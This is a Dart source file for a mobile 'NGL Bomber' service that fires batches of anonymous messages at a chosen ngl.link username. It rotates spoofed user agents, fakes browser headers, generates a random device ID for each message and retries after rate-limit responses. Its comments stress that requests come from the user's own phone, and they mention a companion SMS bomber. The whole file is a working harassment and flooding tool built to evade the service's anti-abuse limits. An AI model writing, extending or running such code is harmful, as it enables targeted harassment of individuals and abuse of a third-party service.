/// lib/services/ngl_service.dart
/// Client-side NGL Bomber — fires requests DIRECTLY from the user's phone.
/// No Railway backend IP involved — each request comes from the user's device.
/// Works exactly like SmsService but for ngl.link/api/submit.

import 'dart:async';
import 'dart:math';
import 'package:http/http.dart' as http;

// ── Result model ──────────────────────────────────────────────────────────────

class NglResult {
  final int    index;
  final bool   success;
  final String message;

  const NglResult({
    required this.index,
    required this.success,
    required this.message,
  });

  Map<String, dynamic> toJson() => {
    'index':   index,
    'success': success,
    'message': message,
  };
}

// ── Service ───────────────────────────────────────────────────────────────────

class NglService {
  static const _kEndpoint      = 'https://ngl.link/api/submit';
  static const _kMaxConcurrent = 5; // max parallel requests per batch

  static const _kUserAgents = [
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; Infinix X6816) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; TECNO KF6i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
  ];

  // ── UUID v4 generator (no dependency needed) ─────────────────────────────

  static String _uuid() {
    final r = Random();
    const h = '0123456789abcdef';
    final buf = StringBuffer();
    for (int i = 0; i < 36; i++) {
      if (i == 8 || i == 13 || i == 18 || i == 23) {
        buf.write('-');
      } else if (i == 14) {
        buf.write('4');
      } else if (i == 19) {
        buf.write(h[(r.nextInt(4) + 8)]);
      } else {
        buf.write(h[r.nextInt(16)]);
      }
    }
    return buf.toString();
  }

  // ── Single message sender ─────────────────────────────────────────────────

  static Future<NglResult> _sendOne(
    http.Client client,
    String      username,
    String      message,
    int         index,
  ) async {
    final deviceId  = _uuid();
    final userAgent = _kUserAgents[Random().nextInt(_kUserAgents.length)];

    // NGL expects form-encoded body, NOT JSON
    final body = 'username=${Uri.encodeComponent(username)}'
        '&question=${Uri.encodeComponent(message)}'
        '&deviceId=$deviceId&gameSlug=&referrer=';

    for (int attempt = 0; attempt < 2; attempt++) {
      try {
        final resp = await client
            .post(
              Uri.parse(_kEndpoint),
              headers: {
                'authority':         'ngl.link',
                'accept':            '*/*',
                'accept-language':   'en-US,en;q=0.9',
                'content-type':      'application/x-www-form-urlencoded; charset=UTF-8',
                'origin':            'https://ngl.link',
                'referer':           'https://ngl.link/$username',
                'sec-fetch-dest':    'empty',
                'sec-fetch-mode':    'cors',
                'sec-fetch-site':    'same-origin',
                'x-requested-with':  'XMLHttpRequest',
                'user-agent':        userAgent,
              },
              body: body,
            )
            .timeout(const Duration(seconds: 12));

        if (resp.statusCode == 200) {
          return NglResult(index: index, success: true, message: 'Sent ✓');
        }
        if (resp.statusCode == 429 && attempt == 0) {
          // Rate limited — short backoff then retry once
          await Future.delayed(const Duration(seconds: 2));
          continue;
        }
        return NglResult(
            index: index, success: false, message: 'HTTP ${resp.statusCode}');
      } on TimeoutException {
        if (attempt == 0) {
          await Future.delayed(const Duration(milliseconds: 500));
          continue;
        }
        return NglResult(index: index, success: false, message: 'Timed out');
      } catch (e) {
        if (attempt == 0) {
          await Future.delayed(const Duration(milliseconds: 500));
          continue;
        }
        final msg = e.toString().contains('SocketException')
            ? 'No connection'
            : 'Error';
        return NglResult(index: index, success: false, message: msg);
      }
    }
    return NglResult(index: index, success: false, message: 'Failed');
  }

  // ── Public API ────────────────────────────────────────────────────────────

  /// Fire [quantity] anonymous messages to [username] directly from the
  /// user's phone. Processes in batches of [_kMaxConcurrent] with a small
  /// pause between batches to avoid hammering NGL.
  ///
  /// [onMessageDone] is called after EACH individual message completes so
  /// the UI can update in real-time (same pattern as SmsService.bombAll).
  static Future<({int sent, int failed, List<NglResult> results})> bombAll({
    required String  username,
    required String  message,
    required int     quantity,
    void Function(NglResult result, int sent, int failed)? onMessageDone,
  }) async {
    final allResults = <NglResult>[];
    int sent   = 0;
    int failed = 0;

    // Reuse one http.Client for all requests (connection pooling)
    final client = http.Client();
    try {
      // Process in batches — avoids opening 50 connections at once
      for (int start = 0; start < quantity; start += _kMaxConcurrent) {
        final end = (start + _kMaxConcurrent).clamp(0, quantity);

        // Small gap between batches (not the first one)
        if (start > 0) {
          await Future.delayed(const Duration(milliseconds: 300));
        }

        final batchFutures = List.generate(
          end - start,
          (i) => _sendOne(client, username, message, start + i),
        );

        // Fire this batch in parallel, collect as all complete
        final batchResults = await Future.wait(batchFutures);

        for (final r in batchResults) {
          allResults.add(r);
          if (r.success) {
            sent++;
          } else {
            failed++;
          }
          onMessageDone?.call(r, sent, failed);
        }
      }
    } finally {
      client.close();
    }

    return (sent: sent, failed: failed, results: allResults);
  }
}
